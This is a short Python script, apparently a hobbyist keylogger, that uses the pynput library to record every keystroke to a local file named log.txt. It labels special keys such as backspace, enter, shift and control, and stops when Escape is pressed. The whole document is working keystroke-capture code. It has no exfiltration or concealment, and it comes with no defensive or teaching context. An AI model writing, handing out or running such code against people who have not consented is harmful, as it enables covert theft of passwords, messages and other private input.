import time
from pynput.keyboard import Listener, Key
import logging

# Setup logging to log the keystrokes to a file
logging.basicConfig(filename="log.txt", level=logging.INFO, format="%(message)s")

# Function to handle each keystroke
def on_press(key):
    try:
        with open("log.txt", "a") as log:  # Open file for each keystroke
            if key == Key.backspace:
                log.write("[backspace] ")
            elif key == Key.enter:
                log.write("\n[enter]\n")
            elif key == Key.space:
                log.write(" ")
            elif key == Key.tab:
                log.write("[tab] ")
            elif key == Key.shift:
                log.write("[shift] ")
            elif key == Key.ctrl_l or key == Key.ctrl_r:
                log.write("[control] ")
            elif key == Key.alt_l or key == Key.alt_r:
                log.write("[alt] ")
            elif key == Key.caps_lock:
                log.write("[caps lock] ")
            elif key == Key.esc:
                return False  # Stop listener when Escape is pressed
            else:
                log.write(str(key).replace("'", "") + " ")  # Handles normal keys safely
    except Exception as e:
        print(f"Error: {e}")

# Start the key logger
def start_logging():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_logging()
